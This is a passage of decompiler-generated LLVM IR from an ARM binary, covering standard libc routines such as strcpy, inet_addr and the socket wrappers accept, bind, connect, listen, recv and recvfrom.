  store i8 %v1_11c64, i8* %v3_11c64, align 1
  %v4_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c64 = add i32 %v4_11c64, 1
  store i32 %v5_11c64, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11c00, { 1, 0 }
  uselistorder i32 %v12_11c2c, { 1, 2, 0 }
  uselistorder i32 %v0_11c0054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11bf8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11be8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11bdc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11c38, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11c10, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11c801 = load i32, i32* @r1, align 4
  %v1_11c802 = inttoptr i32 %v0_11c801 to i8*
  %v2_11c803 = load i8, i8* %v1_11c802, align 1
  %v2_11c845 = icmp eq i8 %v2_11c803, 0
  store i1 %v2_11c845, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11c803, i8* %arg1, align 1
  br i1 %v2_11c845, label %dec_label_pc_11c90, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %entry, %dec_label_pc_11c78
  %v0_11c78 = load i32, i32* @r1, align 4
  %v1_11c78 = add i32 %v0_11c78, 1
  store i32 %v1_11c78, i32* @r1, align 4
  %v0_11c7c = load i32, i32* %r2.global-to-local, align 4
  %v1_11c7c = add i32 %v0_11c7c, 1
  store i32 %v1_11c7c, i32* %r2.global-to-local, align 4
  %v1_11c80 = inttoptr i32 %v1_11c78 to i8*
  %v2_11c80 = load i8, i8* %v1_11c80, align 1
  %v2_11c84 = icmp eq i8 %v2_11c80, 0
  store i1 %v2_11c84, i1* %cpsr_z.global-to-local, align 1
  %v3_11c88 = inttoptr i32 %v1_11c7c to i8*
  store i8 %v2_11c80, i8* %v3_11c88, align 1
  %v0_11c8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11c8c, label %dec_label_pc_11c90, label %dec_label_pc_11c78

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c78, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11c78, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11c9c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11c9c, i32* @r1, align 4
  %v0_11ca0 = call i32 @inet_aton()
  %v2_11ca4 = icmp eq i32 %v0_11ca0, 0
  %v4_11ca8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11ca4, i32 -1, i32 %v4_11ca8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11cbc = load i32, i32* @r7, align 4
  store i32 %v3_11cbc, i32* %stack_var_-8, align 4
  %v0_11cc8 = load i32, i32* @r0, align 4
  store i32 %v0_11cc8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11cc8, -4095
  br i1 %tmp, label %dec_label_pc_11cf0, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %entry
  %v0_11cdc = call i32 @__aeabi_read_tp()
  %v3_11ce0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11ce0 = sext i16 %v3_11ce0 to i32
  %v0_11ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ce4 = sub i32 0, %v0_11ce4
  store i32 %v1_11ce4, i32* %r2.global-to-local, align 4
  %v3_11ce8 = add i32 %v4_11ce0, %v0_11cdc
  %v4_11ce8 = inttoptr i32 %v3_11ce8 to i32*
  store i32 %v1_11ce4, i32* %v4_11ce8, align 4
  %v2_11cf0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %entry, %dec_label_pc_11cd8
  %v1_11cf4 = phi i32 [ %v0_11cc8, %entry ], [ -1, %dec_label_pc_11cd8 ]
  %v2_11cf0 = phi i32 [ %v3_11cbc, %entry ], [ %v2_11cf0.pre, %dec_label_pc_11cd8 ]
  store i32 %v2_11cf0, i32* @r7, align 4
  ret i32 %v1_11cf4

; uselistorder directives
  uselistorder i32 %v0_11cc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11cf0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11cf8:
  %v0_11cf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11cf8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11cf8
  %v2_11cfc = load i32, i32* @r4, align 4
  %v5_11cfc = sdiv i32 %v2_11cfc, 1024
  %v6_11cfc = and i32 %v5_11cfc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11cf8, %bb
  %v7_11cfc = phi i32 [ %arg1, %dec_label_pc_11cf8 ], [ %v6_11cfc, %bb ]
  ret i32 %v7_11cfc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11d04 = load i32, i32* @r4, align 4
  %v9_11d04 = load i32, i32* @r6, align 4
  %v12_11d04 = load i32, i32* @r7, align 4
  %v4_11d10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_11d14 = icmp eq i32 %v4_11d10, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11d14, label %dec_label_pc_11d2c, label %entry.dec_label_pc_11d38_crit_edge

entry.dec_label_pc_11d38_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11d38

dec_label_pc_11d2c:                               ; preds = %entry
  store i32 %v3_11d04, i32* @r4, align 4
  store i32 %v9_11d04, i32* @r6, align 4
  store i32 %v12_11d04, i32* @r7, align 4
  %v0_11d34 = call i32 @__sys_accept()
  br label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %entry.dec_label_pc_11d38_crit_edge, %dec_label_pc_11d2c
  %v0_11d38 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11d38, i32* @r5, align 4
  %v0_11d48 = load i32, i32* @r4, align 4
  store i32 %v0_11d48, i32* @r0, align 4
  %v0_11d4c = call i32 @__sys_accept()
  store i32 %v0_11d4c, i32* @r4, align 4
  %v0_11d54 = load i32, i32* @r5, align 4
  %v1_11d58 = call i32 @__libc_disable_asynccancel(i32 %v0_11d54)
  %v0_11d5c = load i32, i32* @r4, align 4
  store i32 %v12_11d04, i32* @r7, align 4
  ret i32 %v0_11d5c

; uselistorder directives
  uselistorder label %dec_label_pc_11d38, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d74 = load i32, i32* @r7, align 4
  store i32 %v3_11d74, i32* %stack_var_-8, align 4
  %v0_11d80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d80, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d80, -4095
  br i1 %tmp, label %dec_label_pc_11da8, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %entry
  %v0_11d94 = call i32 @__aeabi_read_tp()
  %v3_11d98 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11d98 = sext i16 %v3_11d98 to i32
  %v0_11d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_11d9c = sub i32 0, %v0_11d9c
  store i32 %v1_11d9c, i32* %r2.global-to-local, align 4
  %v3_11da0 = add i32 %v4_11d98, %v0_11d94
  %v4_11da0 = inttoptr i32 %v3_11da0 to i32*
  store i32 %v1_11d9c, i32* %v4_11da0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11da8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11da8

dec_label_pc_11da8:                               ; preds = %entry, %dec_label_pc_11d90
  %v1_11dac = phi i32 [ %v0_11d80, %entry ], [ -1, %dec_label_pc_11d90 ]
  %v2_11da8 = phi i32 [ %v3_11d74, %entry ], [ %v2_11da8.pre, %dec_label_pc_11d90 ]
  store i32 %v2_11da8, i32* @r7, align 4
  ret i32 %v1_11dac

; uselistorder directives
  uselistorder i32 %v0_11d80, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11da8, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11db0:
  %v0_11db0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11db0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11db0
  %v2_11db4 = load i32, i32* @ip, align 4
  %v5_11db4 = mul i32 %v2_11db4, 512
  %v6_11db4 = and i32 %v5_11db4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11db0, %bb
  %v7_11db4 = phi i32 [ %arg1, %dec_label_pc_11db0 ], [ %v6_11db4, %bb ]
  ret i32 %v7_11db4

; uselistorder directives
  uselistorder i32 512, { 0, 8, 5, 1, 2, 9, 6, 10, 7, 11, 3, 12, 4, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11db8 = load i32, i32* @r7, align 4
  store i32 %v3_11db8, i32* %stack_var_-8, align 4
  %v0_11dc4 = load i32, i32* @r0, align 4
  store i32 %v0_11dc4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11dc4, -4095
  br i1 %tmp, label %dec_label_pc_11dec, label %dec_label_pc_11dd4

dec_label_pc_11dd4:                               ; preds = %entry
  %v0_11dd8 = call i32 @__aeabi_read_tp()
  %v3_11ddc = load i16, i16* @global_var_2222c.358, align 2
  %v4_11ddc = sext i16 %v3_11ddc to i32
  store i32 %v4_11ddc, i32* @r3, align 4
  %v0_11de0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11de0 = sub i32 0, %v0_11de0
  store i32 %v1_11de0, i32* %r2.global-to-local, align 4
  %v3_11de4 = add i32 %v4_11ddc, %v0_11dd8
  %v4_11de4 = inttoptr i32 %v3_11de4 to i32*
  store i32 %v1_11de0, i32* %v4_11de4, align 4
  %v2_11dec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %entry, %dec_label_pc_11dd4
  %v1_11df0 = phi i32 [ %v0_11dc4, %entry ], [ -1, %dec_label_pc_11dd4 ]
  %v2_11dec = phi i32 [ %v3_11db8, %entry ], [ %v2_11dec.pre, %dec_label_pc_11dd4 ]
  store i32 %v2_11dec, i32* @r7, align 4
  ret i32 %v1_11df0

; uselistorder directives
  uselistorder i32 %v0_11dc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11dec, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11df4:
  %v0_11df4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11df4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11df4
  %v2_11df8 = load i32, i32* @r8, align 4
  %v5_11df8 = sdiv i32 %v2_11df8, 256
  %v6_11df8 = and i32 %v5_11df8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11df4, %bb
  %v7_11df8 = phi i32 [ %arg1, %dec_label_pc_11df4 ], [ %v6_11df8, %bb ]
  ret i32 %v7_11df8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11e00 = load i32, i32* @r4, align 4
  store i32 %v3_11e00, i32* %stack_var_-20, align 4
  %v6_11e00 = load i32, i32* @r5, align 4
  %v9_11e00 = load i32, i32* @r6, align 4
  %v12_11e00 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r3, align 4
  %v4_11e0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  store i32 %v4_11e0c, i32* @ip, align 4
  %v2_11e10 = icmp eq i32 %v4_11e0c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11e10, label %dec_label_pc_11e28, label %entry.dec_label_pc_11e34_crit_edge

entry.dec_label_pc_11e34_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11e34

dec_label_pc_11e28:                               ; preds = %entry
  store i32 %v3_11e00, i32* @r4, align 4
  store i32 %v9_11e00, i32* @r6, align 4
  store i32 %v12_11e00, i32* @r7, align 4
  %v0_11e30 = call i32 @__sys_connect()
  br label %dec_label_pc_11e34

dec_label_pc_11e34:                               ; preds = %entry.dec_label_pc_11e34_crit_edge, %dec_label_pc_11e28
  %v0_11e34 = call i32 @__libc_enable_asynccancel()
  %v0_11e38 = load i32, i32* @r6, align 4
  store i32 %v0_11e38, i32* @r1, align 4
  store i32 %v0_11e34, i32* @r5, align 4
  %v0_11e44 = load i32, i32* @r4, align 4
  store i32 %v0_11e44, i32* @r0, align 4
  %v0_11e48 = call i32 @__sys_connect()
  store i32 %v0_11e48, i32* @r4, align 4
  %v0_11e50 = load i32, i32* @r5, align 4
  %v1_11e54 = call i32 @__libc_disable_asynccancel(i32 %v0_11e50)
  %v0_11e58 = load i32, i32* @r4, align 4
  %v2_11e60 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11e60, i32* @r4, align 4
  store i32 %v6_11e00, i32* @r5, align 4
  store i32 %v9_11e00, i32* @r6, align 4
  store i32 %v12_11e00, i32* @r7, align 4
  ret i32 %v0_11e58

; uselistorder directives
  uselistorder label %dec_label_pc_11e34, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e70 = load i32, i32* @r7, align 4
  store i32 %v3_11e70, i32* %stack_var_-8, align 4
  %v0_11e7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11e7c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e7c, -4095
  br i1 %tmp, label %dec_label_pc_11ea4, label %dec_label_pc_11e8c

dec_label_pc_11e8c:                               ; preds = %entry
  %v0_11e90 = call i32 @__aeabi_read_tp()
  %v3_11e94 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11e94 = sext i16 %v3_11e94 to i32
  %v0_11e98 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e98 = sub i32 0, %v0_11e98
  store i32 %v1_11e98, i32* %r2.global-to-local, align 4
  %v3_11e9c = add i32 %v4_11e94, %v0_11e90
  %v4_11e9c = inttoptr i32 %v3_11e9c to i32*
  store i32 %v1_11e98, i32* %v4_11e9c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ea4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ea4

dec_label_pc_11ea4:                               ; preds = %entry, %dec_label_pc_11e8c
  %v1_11ea8 = phi i32 [ %v0_11e7c, %entry ], [ -1, %dec_label_pc_11e8c ]
  %v2_11ea4 = phi i32 [ %v3_11e70, %entry ], [ %v2_11ea4.pre, %dec_label_pc_11e8c ]
  store i32 %v2_11ea4, i32* @r7, align 4
  ret i32 %v1_11ea8

; uselistorder directives
  uselistorder i32 %v0_11e7c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ea4, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11eac:
  %v0_11eac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11eac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11eac
  %v2_11eac = load i32, i32* @lr, align 4
  %v8_11eac = shl i32 %v2_11eac, %arg2
  %v9_11eac = and i32 %v8_11eac, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11eac, %bb
  %v4_11eb0 = phi i32 [ %arg1, %dec_label_pc_11eac ], [ %v9_11eac, %bb ]
  ret i32 %v4_11eb0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11eb4 = load i32, i32* @r4, align 4
  store i32 %v3_11eb4, i32* %stack_var_-12, align 4
  %v0_11ec4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ec4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ec4, -4095
  br i1 %tmp, label %dec_label_pc_11eec, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %entry
  %v0_11ed8 = call i32 @__aeabi_read_tp()
  %v3_11edc = load i16, i16* @global_var_2222c.358, align 2
  %v4_11edc = sext i16 %v3_11edc to i32
  %v0_11ee0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ee0 = sub i32 0, %v0_11ee0
  store i32 %v1_11ee0, i32* %r2.global-to-local, align 4
  %v3_11ee4 = add i32 %v4_11edc, %v0_11ed8
  %v4_11ee4 = inttoptr i32 %v3_11ee4 to i32*
  store i32 %v1_11ee0, i32* %v4_11ee4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11eec.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %entry, %dec_label_pc_11ed4
  %v1_11ef0 = phi i32 [ %v0_11ec4, %entry ], [ -1, %dec_label_pc_11ed4 ]
  %v2_11eec = phi i32 [ %v3_11eb4, %entry ], [ %v2_11eec.pre, %dec_label_pc_11ed4 ]
  store i32 %v2_11eec, i32* @r4, align 4
  ret i32 %v1_11ef0

; uselistorder directives
  uselistorder i32 %v0_11ec4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11eec, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11ef4:
  %v0_11ef4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ef4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11ef4
  %v2_11ef8 = load i32, i32* @r8, align 4
  %v5_11ef8 = sdiv i32 %v2_11ef8, 64
  %v6_11ef8 = and i32 %v5_11ef8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11ef4, %bb
  %v7_11ef8 = phi i32 [ %arg1, %dec_label_pc_11ef4 ], [ %v6_11ef8, %bb ]
  ret i32 %v7_11ef8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11efc = load i32, i32* @r7, align 4
  store i32 %v3_11efc, i32* %stack_var_-8, align 4
  %v0_11f08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f08, -4095
  br i1 %tmp, label %dec_label_pc_11f30, label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %entry
  %v0_11f1c = call i32 @__aeabi_read_tp()
  %v3_11f20 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11f20 = sext i16 %v3_11f20 to i32
  %v0_11f24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f24 = sub i32 0, %v0_11f24
  store i32 %v1_11f24, i32* %r2.global-to-local, align 4
  %v3_11f28 = add i32 %v4_11f20, %v0_11f1c
  %v4_11f28 = inttoptr i32 %v3_11f28 to i32*
  store i32 %v1_11f24, i32* %v4_11f28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f30

dec_label_pc_11f30:                               ; preds = %entry, %dec_label_pc_11f18
  %v1_11f34 = phi i32 [ %v0_11f08, %entry ], [ -1, %dec_label_pc_11f18 ]
  %v2_11f30 = phi i32 [ %v3_11efc, %entry ], [ %v2_11f30.pre, %dec_label_pc_11f18 ]
  store i32 %v2_11f30, i32* @r7, align 4
  ret i32 %v1_11f34

; uselistorder directives
  uselistorder i32 %v0_11f08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f30, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f3c = load i32, i32* @r7, align 4
  store i32 %v3_11f3c, i32* %stack_var_-8, align 4
  %v0_11f48 = load i32, i32* @r0, align 4
  store i32 %v0_11f48, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f48, -4095
  br i1 %tmp, label %dec_label_pc_11f70, label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %entry
  %v0_11f5c = call i32 @__aeabi_read_tp()
  %v3_11f60 = load i16, i16* @global_var_2222c.358, align 2
  %v4_11f60 = sext i16 %v3_11f60 to i32
  %v0_11f64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f64 = sub i32 0, %v0_11f64
  store i32 %v1_11f64, i32* %r2.global-to-local, align 4
  %v3_11f68 = add i32 %v4_11f60, %v0_11f5c
  %v4_11f68 = inttoptr i32 %v3_11f68 to i32*
  store i32 %v1_11f64, i32* %v4_11f68, align 4
  %v2_11f70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f70

dec_label_pc_11f70:                               ; preds = %entry, %dec_label_pc_11f58
  %v1_11f74 = phi i32 [ %v0_11f48, %entry ], [ -1, %dec_label_pc_11f58 ]
  %v2_11f70 = phi i32 [ %v3_11f3c, %entry ], [ %v2_11f70.pre, %dec_label_pc_11f58 ]
  store i32 %v2_11f70, i32* @r7, align 4
  ret i32 %v1_11f74

; uselistorder directives
  uselistorder i32 %v0_11f48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f70, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11f78:
  %v0_11f78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f78, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f78
  %v2_11f7c = load i32, i32* @r4, align 4
  %v5_11f7c = sdiv i32 %v2_11f7c, 32
  %v6_11f7c = and i32 %v5_11f7c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f78, %bb
  %v7_11f7c = phi i32 [ %arg1, %dec_label_pc_11f78 ], [ %v6_11f7c, %bb ]
  ret i32 %v7_11f7c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11f84 = load i32, i32* @r4, align 4
  store i32 %v3_11f84, i32* %stack_var_-24, align 4
  %v6_11f84 = load i32, i32* @r5, align 4
  %v9_11f84 = load i32, i32* @r6, align 4
  %v12_11f84 = load i32, i32* @r7, align 4
  %v15_11f84 = load i32, i32* @r8, align 4
  %v18_11f84 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @ip, align 4
  %v4_11f90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_11f94 = icmp eq i32 %v4_11f90, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11f94, label %dec_label_pc_11fac, label %entry.dec_label_pc_11fb4_crit_edge

entry.dec_label_pc_11fb4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11fb4

dec_label_pc_11fac:                               ; preds = %entry
  store i32 %v3_11f84, i32* @r4, align 4
  store i32 %v9_11f84, i32* @r6, align 4
  store i32 %v12_11f84, i32* @r7, align 4
  store i32 %v15_11f84, i32* @r8, align 4
  %v0_11fb0 = call i32 @__sys_recv()
  br label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %entry.dec_label_pc_11fb4_crit_edge, %dec_label_pc_11fac
  %v0_11fb4 = call i32 @__libc_enable_asynccancel()
  %v0_11fb8 = load i32, i32* @r6, align 4
  store i32 %v0_11fb8, i32* @r1, align 4
  store i32 %v0_11fb4, i32* @r5, align 4
  %v0_11fc8 = load i32, i32* @r4, align 4
  store i32 %v0_11fc8, i32* @r0, align 4
  %v0_11fcc = call i32 @__sys_recv()
  store i32 %v0_11fcc, i32* @r4, align 4
  %v0_11fd4 = load i32, i32* @r5, align 4
  %v1_11fd8 = call i32 @__libc_disable_asynccancel(i32 %v0_11fd4)
  %v0_11fdc = load i32, i32* @r4, align 4
  %v2_11fe0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11fe0, i32* @r4, align 4
  store i32 %v6_11f84, i32* @r5, align 4
  store i32 %v9_11f84, i32* @r6, align 4
  store i32 %v12_11f84, i32* @r7, align 4
  store i32 %v15_11f84, i32* @r8, align 4
  store i32 %v18_11f84, i32* @lr, align 4
  ret i32 %v0_11fdc

; uselistorder directives
  uselistorder label %dec_label_pc_11fb4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11ff0 = load i32, i32* @r4, align 4
  store i32 %v3_11ff0, i32* %stack_var_-16, align 4
  %v0_12004 = load i32, i32* @r0, align 4
  store i32 %v0_12004, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12004, -4095
  br i1 %tmp, label %dec_label_pc_1202c, label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %entry
  %v0_12018 = call i32 @__aeabi_read_tp()
  %v3_1201c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1201c = sext i16 %v3_1201c to i32
  %v0_12020 = load i32, i32* %r2.global-to-local, align 4
  %v1_12020 = sub i32 0, %v0_12020
  store i32 %v1_12020, i32* %r2.global-to-local, align 4
  %v3_12024 = add i32 %v4_1201c, %v0_12018
  %v4_12024 = inttoptr i32 %v3_12024 to i32*
  store i32 %v1_12020, i32* %v4_12024, align 4
  %v2_1202c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1202c

dec_label_pc_1202c:                               ; preds = %entry, %dec_label_pc_12014
  %v1_12030 = phi i32 [ %v0_12004, %entry ], [ -1, %dec_label_pc_12014 ]
  %v2_1202c = phi i32 [ %v3_11ff0, %entry ], [ %v2_1202c.pre, %dec_label_pc_12014 ]
  store i32 %v2_1202c, i32* @r4, align 4
  ret i32 %v1_12030

; uselistorder directives
  uselistorder i32 %v0_12004, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1202c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12038 = load i32, i32* @r4, align 4
  store i32 %v3_12038, i32* %stack_var_-32, align 4
